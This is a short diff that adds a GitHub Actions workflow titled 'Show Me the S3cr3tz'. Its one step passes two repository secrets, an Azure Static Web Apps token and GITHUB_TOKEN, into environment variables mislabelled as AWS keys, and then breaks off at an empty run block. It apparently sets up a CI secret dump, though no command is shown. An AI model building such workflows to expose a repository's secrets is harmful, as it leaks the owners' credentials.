@@ -1,0 +1,19 @@
+name: Show Me the S3cr3tz
+on: 
+  workflow_dispatch
+
+jobs:
+  debug:
+    name: Debug
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: Set up secret file
+      env:
+        AWS_ACCESS_KEY_ID: ${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_MANGO_GROUND_085C80800 }}
+        AWS_ACCESS_KEY: ${{ secrets.GITHUB_TOKEN }}
+
+      run: |
